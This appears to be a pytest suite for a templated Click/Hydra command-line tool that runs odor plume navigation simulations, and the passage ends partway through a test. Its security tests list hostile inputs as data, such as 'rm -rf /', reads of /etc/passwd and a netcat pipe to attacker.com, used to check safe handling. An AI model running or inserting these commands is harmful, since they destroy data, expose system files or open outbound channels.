"""
Comprehensive CLI testing module validating the main command-line interface implementation.

This module provides exhaustive testing coverage for the CLI interface built with Click framework
and Hydra configuration management, validating command registration, parameter validation,
configuration override handling, multi-run execution, error scenarios, help text generation,
and CLI performance requirements ensuring robust command-line interface functionality across
all supported operations and use cases.

The test suite validates:
- CLI command execution with exit code validation and output verification per F-013-RQ-001
- Comprehensive help message validation and usage example testing per F-013-RQ-002
- Parameter override support for configuration values via command-line flags per F-013-RQ-003
- CLI initialization performance ensuring <2s startup time per Section 2.2.9.3
- Multi-run parameter sweep testing via --multirun flag per Section 7.4.4.1
- Click framework integration with parameter validation and type checking per Section 2.2.10.1
- Hydra configuration composition with hierarchical override support per Section 7.2.3.2
- Configuration validation and export command testing per Section 7.4.3.2
- CLI security testing preventing command injection and parameter pollution per Section 6.6.7.2
- Batch processing validation for automated experiment execution per Section 7.4.2.1
- Error handling with comprehensive validation and recovery strategies per Section 4.1.3.2
- CLI test coverage target of ≥80% per Section 6.6.3.1 quality metrics
"""

import pytest
import time
import json
import tempfile
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Dict, Any, List, Optional, Union
from unittest.mock import Mock, patch, MagicMock, call
from contextlib import contextmanager

# Click testing framework
from click.testing import CliRunner
import click

# Hydra testing support
try:
    from hydra import compose, initialize, initialize_config_dir
    from hydra.core.global_hydra import GlobalHydra
    from hydra.core.config_store import ConfigStore
    from hydra.test_utils.test_utils import (
        create_temporary_dir,
        chdir_hydra_root,
        create_config_search_path
    )
    from omegaconf import DictConfig, OmegaConf
    HYDRA_AVAILABLE = True
except ImportError:
    HYDRA_AVAILABLE = False
    compose = None
    initialize = None
    DictConfig = dict
    OmegaConf = None

# NumPy for data validation
import numpy as np

# Import test utilities
from tests.helpers.import_validator import (
    assert_imported_from,
    assert_all_imported_from,
    validate_new_package_components
)

# Import CLI components under test
from {{cookiecutter.project_slug}}.cli.main import (
    cli,
    main,
    run,
    config,
    visualize,
    batch,
    CLIError,
    ConfigValidationError,
    _setup_cli_logging,
    _validate_hydra_availability,
    _validate_configuration,
    _export_config_documentation,
    _measure_performance,
    _safe_config_access,
    _CLI_CONFIG
)

from {{cookiecutter.project_slug}}.cli import (
    get_cli_version,
    is_cli_available,
    validate_cli_environment,
    register_command,
    extend_cli,
    run_command,
    get_available_commands,
    CLI_CONFIG as CLI_MODULE_CONFIG
)

# Import dependencies for testing
from {{cookiecutter.project_slug}}.api.navigation import (
    create_navigator,
    create_video_plume,
    run_plume_simulation,
    ConfigurationError,
    SimulationError
)

from {{cookiecutter.project_slug}}.config.schemas import (
    NavigatorConfig,
    VideoPlumeConfig,
    SimulationConfig
)

from {{cookiecutter.project_slug}}.utils.seed_manager import (
    set_global_seed,
    get_current_seed,
    get_seed_manager
)


class TestCLIImportValidation:
    """
    Test suite validating CLI component imports follow cookiecutter template structure.
    
    Ensures all CLI imports are correctly sourced from the new package organization
    per the refactoring requirements and template structure compliance.
    """

    def test_cli_main_imports(self):
        """Validate that CLI main components are imported from correct modules."""
        cli_imports = {
            'cli': cli,
            'main': main,
            'run': run,
            'config': config,
            'visualize': visualize,
            'batch': batch,
            'CLIError': CLIError,
            'ConfigValidationError': ConfigValidationError
        }
        
        assert_all_imported_from(
            cli_imports,
            '{{cookiecutter.project_slug}}.cli.main'
        )

    def test_cli_init_imports(self):
        """Validate that CLI module utilities are imported from correct locations."""
        cli_module_imports = {
            'get_cli_version': get_cli_version,
            'is_cli_available': is_cli_available,
            'validate_cli_environment': validate_cli_environment,
            'register_command': register_command,
            'extend_cli': extend_cli
        }
        
        assert_all_imported_from(
            cli_module_imports,
            '{{cookiecutter.project_slug}}.cli'
        )

    def test_api_navigation_imports(self):
        """Validate navigation API imports from refactored structure."""
        api_imports = {
            'create_navigator': create_navigator,
            'create_video_plume': create_video_plume,
            'run_plume_simulation': run_plume_simulation
        }
        
        assert_all_imported_from(
            api_imports,
            '{{cookiecutter.project_slug}}.api.navigation'
        )

    def test_config_schema_imports(self):
        """Validate configuration schema imports from new config module."""
        config_imports = {
            'NavigatorConfig': NavigatorConfig,
            'VideoPlumeConfig': VideoPlumeConfig,
            'SimulationConfig': SimulationConfig
        }
        
        assert_all_imported_from(
            config_imports,
            '{{cookiecutter.project_slug}}.config.schemas'
        )

    def test_seed_manager_imports(self):
        """Validate seed management imports from utils module."""
        seed_imports = {
            'set_global_seed': set_global_seed,
            'get_current_seed': get_current_seed,
            'get_seed_manager': get_seed_manager
        }
        
        assert_all_imported_from(
            seed_imports,
            '{{cookiecutter.project_slug}}.utils.seed_manager'
        )


class TestCLIFrameworkIntegration:
    """
    Test suite validating Click framework integration and command registration.
    
    Tests Click command structure, parameter validation, type checking, and
    command group organization per Section 2.2.10.1 requirements.
    """

    def setup_method(self):
        """Initialize CLI runner and reset global state for each test."""
        self.runner = CliRunner()
        # Clear any global CLI state
        _CLI_CONFIG.clear()
        _CLI_CONFIG.update({
            'verbose': False,
            'quiet': False,
            'log_level': 'INFO',
            'start_time': None,
            'dry_run': False
        })

    def test_cli_group_structure(self):
        """Test that CLI has correct command group structure."""
        # Test main CLI group exists and is properly configured
        assert isinstance(cli, click.Group)
        assert cli.name is None  # Main group
        assert hasattr(cli, 'commands')
        
        # Verify expected commands are registered
        expected_commands = {'run', 'config', 'visualize', 'batch'}
        actual_commands = set(cli.commands.keys())
        assert expected_commands.issubset(actual_commands), (
            f"Missing commands: {expected_commands - actual_commands}"
        )

    def test_cli_global_options(self):
        """Test CLI global options are properly configured."""
        result = self.runner.invoke(cli, ['--help'])
        assert result.exit_code == 0
        
        # Check for global options in help text
        help_text = result.output
        assert '--verbose' in help_text
        assert '--quiet' in help_text
        assert '--log-level' in help_text
        
        # Test global option functionality
        with patch('{{cookiecutter.project_slug}}.cli.main._setup_cli_logging') as mock_logging:
            result = self.runner.invoke(cli, ['--verbose', '--help'])
            assert result.exit_code == 0
            mock_logging.assert_called_once()
            args, kwargs = mock_logging.call_args
            assert kwargs.get('verbose') is True

    def test_cli_command_registration(self):
        """Test that commands are properly registered with Click."""
        # Test run command registration
        assert 'run' in cli.commands
        run_cmd = cli.commands['run']
        assert isinstance(run_cmd, click.Command)
        assert run_cmd.name == 'run'
        
        # Test config group registration
        assert 'config' in cli.commands
        config_cmd = cli.commands['config']
        assert isinstance(config_cmd, click.Group)
        assert 'validate' in config_cmd.commands
        assert 'export' in config_cmd.commands

    def test_click_parameter_validation(self):
        """Test Click parameter type validation and constraints."""
        # Test invalid log level
        result = self.runner.invoke(cli, ['--log-level', 'INVALID'])
        assert result.exit_code != 0
        assert 'Invalid value' in result.output or 'INVALID' in result.output

    @pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
    def test_hydra_decorator_integration(self):
        """Test that @hydra.main decorator is properly integrated."""
        # Test that main function has Hydra decorator attributes
        assert hasattr(main, '__wrapped__') or hasattr(main, '_hydra_main_config_path')
        
        # Test that CLI can handle Hydra configuration
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra_config:
            mock_hydra_config.initialized.return_value = False
            result = self.runner.invoke(cli, ['run', '--dry-run'])
            # Should handle gracefully when Hydra not initialized


class TestCLIPerformanceRequirements:
    """
    Test suite validating CLI performance requirements per Section 2.2.9.3.
    
    Ensures CLI initialization time <2s, command response times, and
    performance monitoring compliance across all CLI operations.
    """

    def setup_method(self):
        """Initialize performance testing environment."""
        self.runner = CliRunner()
        self.performance_threshold = 2.0  # 2 second requirement

    def test_cli_initialization_performance(self):
        """Test CLI initialization meets <2s performance requirement."""
        start_time = time.time()
        
        # Import and initialize CLI (this tests module loading time)
        from {{cookiecutter.project_slug}}.cli.main import cli
        
        initialization_time = time.time() - start_time
        assert initialization_time < self.performance_threshold, (
            f"CLI initialization took {initialization_time:.3f}s, "
            f"exceeds {self.performance_threshold}s requirement"
        )

    def test_help_command_performance(self):
        """Test help command generation meets performance requirements."""
        start_time = time.time()
        result = self.runner.invoke(cli, ['--help'])
        response_time = time.time() - start_time
        
        assert result.exit_code == 0
        assert response_time < 1.0, (
            f"Help command took {response_time:.3f}s, should be <1s for instant response"
        )

    def test_command_discovery_performance(self):
        """Test command discovery and registration performance."""
        start_time = time.time()
        
        # Test getting available commands
        available_commands = get_available_commands()
        
        discovery_time = time.time() - start_time
        assert discovery_time < 0.5, (
            f"Command discovery took {discovery_time:.3f}s, should be <0.5s"
        )
        assert isinstance(available_commands, dict)
        assert len(available_commands) > 0

    def test_performance_measurement_utility(self):
        """Test _measure_performance utility function."""
        start_time = time.time()
        time.sleep(0.1)  # Simulate some work
        
        with patch('{{cookiecutter.project_slug}}.cli.main.logger') as mock_logger:
            _measure_performance("test_function", start_time)
            
            # Should log debug message for normal performance
            mock_logger.debug.assert_called_once()
            call_args = mock_logger.debug.call_args[0]
            assert "test_function completed in" in call_args[0]

    def test_performance_warning_threshold(self):
        """Test performance warning when operations exceed 2s threshold."""
        past_time = time.time() - 3.0  # Simulate 3 second operation
        
        with patch('{{cookiecutter.project_slug}}.cli.main.logger') as mock_logger:
            _measure_performance("slow_function", past_time)
            
            # Should log warning for slow performance
            mock_logger.warning.assert_called_once()
            call_args = mock_logger.warning.call_args[0]
            assert "slow_function took" in call_args[0]
            assert ">2s threshold" in call_args[0]


class TestCLICommandExecution:
    """
    Test suite for CLI command execution with exit code validation and output verification.
    
    Validates command execution per F-013-RQ-001 requirements including proper
    exit codes, output formatting, and error handling across all CLI operations.
    """

    def setup_method(self):
        """Initialize CLI testing environment with clean state."""
        self.runner = CliRunner()
        self.temp_dir = None

    def teardown_method(self):
        """Clean up temporary directories and reset global state."""
        if self.temp_dir and Path(self.temp_dir).exists():
            shutil.rmtree(self.temp_dir)
        
        # Reset CLI configuration
        _CLI_CONFIG.clear()
        _CLI_CONFIG.update({
            'verbose': False,
            'quiet': False,
            'log_level': 'INFO',
            'start_time': None,
            'dry_run': False
        })

    def test_main_cli_help_command(self):
        """Test main CLI help command execution and output format."""
        result = self.runner.invoke(cli, ['--help'])
        
        assert result.exit_code == 0
        assert 'Odor Plume Navigation CLI' in result.output
        assert 'Examples:' in result.output
        assert '{{cookiecutter.project_slug}}-cli run' in result.output
        
        # Verify essential commands are listed
        assert 'run' in result.output
        assert 'config' in result.output
        assert 'visualize' in result.output
        assert 'batch' in result.output

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    @patch('{{cookiecutter.project_slug}}.cli.main.create_navigator')
    @patch('{{cookiecutter.project_slug}}.cli.main.create_video_plume')
    def test_run_command_dry_run_execution(self, mock_plume, mock_navigator, mock_hydra):
        """Test run command dry-run execution with validation."""
        # Mock Hydra configuration
        mock_cfg = DictConfig({
            'navigator': {'position': [50, 50], 'max_speed': 5.0},
            'video_plume': {'video_path': 'test.mp4'},
            'simulation': {'num_steps': 100}
        })
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {
                'valid': True,
                'errors': [],
                'warnings': [],
                'summary': {'navigator': 'valid', 'video_plume': 'valid', 'simulation': 'valid'}
            }
            
            result = self.runner.invoke(cli, ['run', '--dry-run'])
            
            assert result.exit_code == 0
            assert 'Dry-run mode: Simulation validation completed successfully' in result.output
            mock_validate.assert_called_once()

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_run_command_missing_hydra_config(self, mock_hydra):
        """Test run command error handling when Hydra config missing."""
        mock_hydra.initialized.return_value = False
        
        result = self.runner.invoke(cli, ['run'])
        
        assert result.exit_code == 1
        assert 'Hydra configuration not initialized' in result.output

    def test_config_validate_command_execution(self):
        """Test config validate command execution and output."""
        result = self.runner.invoke(config, ['validate', '--help'])
        
        assert result.exit_code == 0
        assert 'Validate Hydra configuration files' in result.output
        assert '--strict' in result.output
        assert '--export-results' in result.output

    def test_config_export_command_execution(self):
        """Test config export command execution and parameters."""
        result = self.runner.invoke(config, ['export', '--help'])
        
        assert result.exit_code == 0
        assert 'Export current configuration' in result.output
        assert '--output' in result.output
        assert '--format' in result.output
        assert 'yaml' in result.output
        assert 'json' in result.output

    def test_visualize_export_command_execution(self):
        """Test visualize export command execution and options."""
        result = self.runner.invoke(visualize, ['export', '--help'])
        
        assert result.exit_code == 0
        assert 'Export visualization' in result.output
        assert '--input-data' in result.output
        assert '--format' in result.output
        assert 'mp4' in result.output
        assert 'gif' in result.output
        assert 'png' in result.output

    def test_batch_command_execution(self):
        """Test batch command execution and parameters."""
        result = self.runner.invoke(batch, ['--help'])
        
        assert result.exit_code == 0
        assert 'Execute batch processing' in result.output
        assert '--jobs' in result.output
        assert '--config-dir' in result.output
        assert '--pattern' in result.output

    def test_command_exit_codes(self):
        """Test proper exit codes for various command scenarios."""
        # Test successful help command
        result = self.runner.invoke(cli, ['--help'])
        assert result.exit_code == 0
        
        # Test invalid command
        result = self.runner.invoke(cli, ['nonexistent-command'])
        assert result.exit_code != 0
        
        # Test invalid option
        result = self.runner.invoke(cli, ['--invalid-option'])
        assert result.exit_code != 0


class TestCLIParameterOverrideSupport:
    """
    Test suite for parameter override support testing per F-013-RQ-003.
    
    Validates configuration override handling via command-line flags and
    Hydra parameter composition with hierarchical override support.
    """

    def setup_method(self):
        """Initialize parameter override testing environment."""
        self.runner = CliRunner()

    @pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_hydra_parameter_override_syntax(self, mock_hydra):
        """Test Hydra parameter override syntax handling."""
        mock_cfg = DictConfig({
            'navigator': {'max_speed': 5.0},
            'simulation': {'num_steps': 100}
        })
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        # Test that override parameters are properly passed through
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {'valid': True, 'errors': [], 'warnings': [], 'summary': {}}
            
            result = self.runner.invoke(cli, [
                'run',
                '--dry-run',
                'navigator.max_speed=10.0',
                'simulation.num_steps=500'
            ])
            
            # Command should execute (Hydra handles the override parsing)
            assert result.exit_code == 0

    def test_cli_option_override_handling(self):
        """Test CLI-specific option override handling."""
        # Test verbose option override
        result = self.runner.invoke(cli, ['--verbose', '--help'])
        assert result.exit_code == 0
        
        # Test quiet option override
        result = self.runner.invoke(cli, ['--quiet', '--help'])
        assert result.exit_code == 0
        
        # Test log level override
        result = self.runner.invoke(cli, ['--log-level', 'DEBUG', '--help'])
        assert result.exit_code == 0

    def test_command_specific_parameter_overrides(self):
        """Test command-specific parameter override handling."""
        # Test run command with seed override
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = False
            result = self.runner.invoke(cli, ['run', '--seed', '42', '--dry-run'])
            
            # Should handle seed parameter even without full config
            assert '--seed' in str(result)

    def test_safe_config_access_utility(self):
        """Test _safe_config_access utility for parameter override support."""
        # Create test configuration
        test_cfg = DictConfig({
            'navigator': {
                'max_speed': 5.0,
                'position': [10, 20]
            },
            'simulation': {
                'num_steps': 100
            }
        })
        
        # Test successful access
        value = _safe_config_access(test_cfg, 'navigator.max_speed')
        assert value == 5.0
        
        # Test nested access
        position = _safe_config_access(test_cfg, 'navigator.position')
        assert position == [10, 20]
        
        # Test missing path with default
        missing = _safe_config_access(test_cfg, 'missing.path', default='default_value')
        assert missing == 'default_value'
        
        # Test missing path without default
        missing = _safe_config_access(test_cfg, 'missing.path')
        assert missing is None


class TestCLIMultiRunExecution:
    """
    Test suite for multi-run parameter sweep testing per Section 7.4.4.1.
    
    Validates --multirun flag functionality, parameter sweep scenarios,
    and automation workflow support for experiment orchestration.
    """

    def setup_method(self):
        """Initialize multi-run testing environment."""
        self.runner = CliRunner()

    @pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
    def test_multirun_flag_recognition(self):
        """Test that --multirun flag is properly recognized."""
        # Test multirun help is available
        result = self.runner.invoke(cli, ['--help'])
        assert result.exit_code == 0
        
        # The --multirun flag is handled by Hydra's @hydra.main decorator
        # We test that our CLI can handle it being passed
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = False
            result = self.runner.invoke(cli, ['--multirun', 'run', '--dry-run'])
            
            # Should not crash with multirun flag
            assert result.exit_code in [0, 1]  # May fail due to missing config but should not crash

    def test_multirun_parameter_sweep_syntax(self):
        """Test parameter sweep syntax for multirun execution."""
        # Test that sweep syntax is properly formatted in help
        result = self.runner.invoke(cli, ['run', '--help'])
        assert result.exit_code == 0
        
        # Check for parameter sweep examples in help text
        help_text = result.output
        assert 'navigator.max_speed=' in help_text or 'parameter override' in help_text.lower()

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_multirun_configuration_handling(self, mock_hydra):
        """Test multirun configuration handling and validation."""
        # Mock multirun configuration
        mock_cfg = DictConfig({
            'navigator': {'max_speed': 5.0},
            'simulation': {'num_steps': 100}
        })
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {'valid': True, 'errors': [], 'warnings': [], 'summary': {}}
            
            # Test that multirun scenarios can be validated
            result = self.runner.invoke(cli, ['run', '--dry-run'])
            assert result.exit_code == 0

    def test_automation_workflow_compatibility(self):
        """Test CLI compatibility with automation workflows."""
        # Test batch processing support
        result = self.runner.invoke(batch, ['--help'])
        assert result.exit_code == 0
        assert '--jobs' in result.output
        
        # Test non-interactive execution
        result = self.runner.invoke(cli, ['--quiet', '--help'])
        assert result.exit_code == 0


class TestCLIConfigurationValidation:
    """
    Test suite for configuration validation and export command testing.
    
    Validates configuration commands per Section 7.4.3.2 development support
    including validation, export, and documentation generation functionality.
    """

    def setup_method(self):
        """Initialize configuration testing environment."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Clean up temporary directories."""
        if Path(self.temp_dir).exists():
            shutil.rmtree(self.temp_dir)

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_config_validate_command_success(self, mock_hydra):
        """Test config validate command with valid configuration."""
        mock_cfg = DictConfig({
            'navigator': {'position': [50, 50], 'max_speed': 5.0},
            'video_plume': {'video_path': 'test.mp4'},
            'simulation': {'num_steps': 100}
        })
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {
                'valid': True,
                'errors': [],
                'warnings': [],
                'summary': {
                    'navigator': 'valid',
                    'video_plume': 'valid',
                    'simulation': 'valid'
                }
            }
            
            result = self.runner.invoke(config, ['validate'])
            
            assert result.exit_code == 0
            assert 'Configuration is valid!' in result.output
            assert 'navigator: valid' in result.output

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_config_validate_command_failure(self, mock_hydra):
        """Test config validate command with invalid configuration."""
        mock_cfg = DictConfig({'invalid': 'config'})
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {
                'valid': False,
                'errors': ['Navigator config invalid: missing position'],
                'warnings': ['Video plume not configured'],
                'summary': {'navigator': 'invalid'}
            }
            
            result = self.runner.invoke(config, ['validate'])
            
            assert result.exit_code == 1
            assert 'Configuration validation failed!' in result.output
            assert 'ERROR: Navigator config invalid' in result.output

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_config_validate_strict_mode(self, mock_hydra):
        """Test config validate command with strict validation mode."""
        mock_cfg = DictConfig({'test': 'config'})
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {
                'valid': False,
                'errors': ['Strict validation failed'],
                'warnings': [],
                'summary': {}
            }
            
            result = self.runner.invoke(config, ['validate', '--strict'])
            
            assert result.exit_code == 1
            mock_validate.assert_called_once()
            args, kwargs = mock_validate.call_args
            assert kwargs['strict'] is True

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_config_export_yaml_format(self, mock_hydra):
        """Test config export command with YAML format."""
        mock_cfg = DictConfig({
            'navigator': {'max_speed': 5.0},
            'simulation': {'num_steps': 100}
        })
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        output_file = Path(self.temp_dir) / 'exported_config.yaml'
        
        with patch('{{cookiecutter.project_slug}}.cli.main.OmegaConf.save') as mock_save:
            result = self.runner.invoke(config, [
                'export',
                '--output', str(output_file),
                '--format', 'yaml'
            ])
            
            assert result.exit_code == 0
            assert f'Configuration exported to: {output_file}' in result.output
            mock_save.assert_called_once()

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    def test_config_export_json_format(self, mock_hydra):
        """Test config export command with JSON format."""
        mock_cfg = DictConfig({'test': 'config'})
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        output_file = Path(self.temp_dir) / 'exported_config.json'
        
        with patch('builtins.open', create=True) as mock_open, \
             patch('json.dump') as mock_json_dump:
            
            result = self.runner.invoke(config, [
                'export',
                '--output', str(output_file),
                '--format', 'json'
            ])
            
            assert result.exit_code == 0
            mock_json_dump.assert_called_once()

    def test_config_export_results_functionality(self):
        """Test config validate with export results functionality."""
        export_file = Path(self.temp_dir) / 'validation_results.json'
        
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = False
            
            result = self.runner.invoke(config, [
                'validate',
                '--export-results', str(export_file)
            ])
            
            # Should handle missing Hydra config gracefully
            assert result.exit_code == 1

    def test_validate_configuration_utility_function(self):
        """Test _validate_configuration utility function."""
        # Create test configuration
        test_cfg = DictConfig({
            'navigator': {
                'position': [50, 50],
                'max_speed': 5.0
            },
            'simulation': {
                'num_steps': 100
            }
        })
        
        with patch('{{cookiecutter.project_slug}}.cli.main.NavigatorConfig') as mock_nav_config, \
             patch('{{cookiecutter.project_slug}}.cli.main.SimulationConfig') as mock_sim_config:
            
            # Mock successful validation
            mock_nav_config.model_validate.return_value = Mock()
            mock_sim_config.model_validate.return_value = Mock()
            
            result = _validate_configuration(test_cfg, strict=False)
            
            assert isinstance(result, dict)
            assert 'valid' in result
            assert 'errors' in result
            assert 'warnings' in result
            assert 'summary' in result


class TestCLISecurityValidation:
    """
    Test suite for CLI security testing per Section 6.6.7.2.
    
    Validates command injection prevention, parameter pollution prevention,
    input sanitization, and security best practices across CLI operations.
    """

    def setup_method(self):
        """Initialize security testing environment."""
        self.runner = CliRunner()

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        # Test various command injection attempts
        injection_attempts = [
            '; rm -rf /',
            '&& cat /etc/passwd',
            '| nc attacker.com 4444',
            '$(rm -rf /)',
            '`cat /etc/passwd`',
            '\n\rls -la',
            '../../../etc/passwd'
        ]
        
        for injection in injection_attempts:
            # Test injection in various parameter contexts
            result = self.runner.invoke(cli, ['run', '--output-dir', injection, '--dry-run'])
            
            # Command should either reject malicious input or handle it safely
            # We don't expect system compromise
            assert result.exit_code in [0, 1, 2]  # Normal exit codes
            
            # Verify no actual command execution occurred
            # This is implicit - if injection worked, test environment would be compromised

    def test_parameter_pollution_prevention(self):
        """Test prevention of parameter pollution attacks."""
        # Test duplicate parameter handling
        result = self.runner.invoke(cli, [
            'run',
            '--seed', '42',
            '--seed', '999',  # Duplicate parameter
            '--dry-run'
        ])
        
        # Should handle duplicate parameters gracefully
        assert result.exit_code in [0, 1]
        
        # Test parameter overflow
        large_params = ['--output-dir', 'x' * 10000]  # Very long parameter
        result = self.runner.invoke(cli, ['run'] + large_params + ['--dry-run'])
        assert result.exit_code in [0, 1]

    def test_input_sanitization(self):
        """Test input sanitization for various CLI parameters."""
        # Test file path sanitization
        malicious_paths = [
            '../../../etc/passwd',
            '/dev/null',
            'CON:',  # Windows reserved name
            'file\x00.txt',  # Null byte injection
            'file\r\n.txt',  # CRLF injection
        ]
        
        for path in malicious_paths:
            result = self.runner.invoke(cli, ['config', 'export', '--output', path])
            
            # Should handle malicious paths safely
            assert result.exit_code in [0, 1]

    def test_environment_variable_injection_prevention(self):
        """Test prevention of environment variable injection."""
        # Test with potentially malicious environment variable patterns
        malicious_env_patterns = [
            '${MALICIOUS_VAR}',
            '$(echo malicious)',
            '`cat /etc/passwd`',
            '\x00MALICIOUS=1',
        ]
        
        for pattern in malicious_env_patterns:
            result = self.runner.invoke(cli, ['run', '--experiment-name', pattern, '--dry-run'])
            
            # Should handle environment variable patterns safely
            assert result.exit_code in [0, 1]

    def test_log_injection_prevention(self):
        """Test prevention of log injection attacks."""
        # Test log injection via CLI parameters
        log_injection_attempts = [
            'test\r\nFAKE LOG ENTRY',
            'test\x1b[31mFAKE ERROR',
            'test\nINFO: Fake info message',
            'test\r\nADMIN: Password: secret123',
        ]
        
        for injection in log_injection_attempts:
            with patch('{{cookiecutter.project_slug}}.cli.main.logger') as mock_logger:
                result = self.runner.invoke(cli, ['--verbose', 'run', '--experiment-name', injection, '--dry-run'])
                
                # Verify logs don't contain unsanitized injection content
                # Logger should properly escape or sanitize log content
                assert result.exit_code in [0, 1]

    def test_safe_config_access_security(self):
        """Test security of _safe_config_access utility."""
        # Create test configuration with potentially dangerous content
        test_cfg = DictConfig({
            'normal_key': 'normal_value',
            'malicious_key': '$(rm -rf /)',
            'nested': {
                'injection': '`cat /etc/passwd`'
            }
        })
        
        # Test that safe access doesn't execute injected content
        value = _safe_config_access(test_cfg, 'malicious_key')
        assert value == '$(rm -rf /)'  # Should return as string, not execute
        
        nested_value = _safe_config_access(test_cfg, 'nested.injection')
        assert nested_value == '`cat /etc/passwd`'  # Should return as string


class TestCLIErrorHandling:
    """
    Test suite for error handling testing per Section 4.1.3.2.
    
    Validates comprehensive error handling, validation strategies, recovery
    mechanisms, and error reporting across all CLI operations and edge cases.
    """

    def setup_method(self):
        """Initialize error handling testing environment."""
        self.runner = CliRunner()

    def test_cli_error_class_hierarchy(self):
        """Test CLI error class hierarchy and inheritance."""
        # Test CLIError instantiation
        cli_error = CLIError("Test CLI error")
        assert isinstance(cli_error, Exception)
        assert str(cli_error) == "Test CLI error"
        
        # Test ConfigValidationError instantiation
        config_error = ConfigValidationError("Test config error")
        assert isinstance(config_error, Exception)
        assert str(config_error) == "Test config error"

    def test_missing_dependencies_error_handling(self):
        """Test error handling when dependencies are missing."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HYDRA_AVAILABLE', False):
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_hydra_availability') as mock_validate:
                mock_validate.side_effect = CLIError("Hydra is required for CLI functionality")
                
                result = self.runner.invoke(cli, ['run'])
                assert result.exit_code == 1
                assert 'Hydra is required' in result.output

    def test_invalid_configuration_error_handling(self):
        """Test error handling for invalid configuration scenarios."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = True
            mock_cfg = DictConfig({'invalid': 'config'})
            mock_hydra.get.return_value.cfg = mock_cfg
            
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
                mock_validate.return_value = {
                    'valid': False,
                    'errors': ['Invalid navigator configuration'],
                    'warnings': [],
                    'summary': {}
                }
                
                result = self.runner.invoke(cli, ['run'])
                assert result.exit_code == 1

    def test_file_not_found_error_handling(self):
        """Test error handling for missing files."""
        # Test missing video file
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = True
            mock_cfg = DictConfig({
                'video_plume': {'video_path': '/nonexistent/file.mp4'}
            })
            mock_hydra.get.return_value.cfg = mock_cfg
            
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
                mock_validate.return_value = {
                    'valid': False,
                    'errors': ['Video file not found: /nonexistent/file.mp4'],
                    'warnings': [],
                    'summary': {}
                }
                
                result = self.runner.invoke(cli, ['run'])
                assert result.exit_code == 1

    def test_keyboard_interrupt_handling(self):
        """Test graceful handling of keyboard interrupts."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = True
            mock_cfg = DictConfig({'test': 'config'})
            mock_hydra.get.return_value.cfg = mock_cfg
            
            # Mock KeyboardInterrupt during simulation
            with patch('{{cookiecutter.project_slug}}.cli.main.run_plume_simulation') as mock_sim:
                mock_sim.side_effect = KeyboardInterrupt()
                
                result = self.runner.invoke(cli, ['run'])
                assert result.exit_code == 1

    def test_unexpected_exception_handling(self):
        """Test handling of unexpected exceptions."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = True
            mock_cfg = DictConfig({'test': 'config'})
            mock_hydra.get.return_value.cfg = mock_cfg
            
            # Mock unexpected exception
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
                mock_validate.side_effect = RuntimeError("Unexpected error")
                
                result = self.runner.invoke(cli, ['run'])
                assert result.exit_code == 1
                assert 'Unexpected error' in result.output

    def test_validation_error_recovery(self):
        """Test error recovery strategies for validation failures."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = True
            mock_cfg = DictConfig({
                'navigator': {'max_speed': -5.0}  # Invalid negative speed
            })
